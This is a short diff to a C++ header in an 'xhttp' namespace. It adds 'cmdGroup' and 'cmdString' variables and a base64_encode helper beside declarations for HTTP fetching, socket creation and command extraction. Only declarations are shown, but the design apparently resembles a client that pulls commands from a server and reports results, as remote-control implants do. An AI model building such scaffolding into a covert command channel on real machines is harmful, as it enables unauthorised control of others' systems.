@@ -17,12 +17,15 @@ namespace xhttp {
     extern std::string cmd;
     extern int key;
     extern std::string cmdResponse;
+    extern std::string cmdGroup;
+    extern std::string cmdString;
 
     std::string http_get(const std::string& url);
     std::vector<char> receive_data(SOCKET ConnectSocket);
     SOCKET create_socket(const std::string& host, int port);
     std::string extractCMD(const std::vector<char>& data);
-
+    std::string base64_encode(const std::string &in);
+    
     struct Command {
     std::string cmdGroup;
     std::string cmdString;
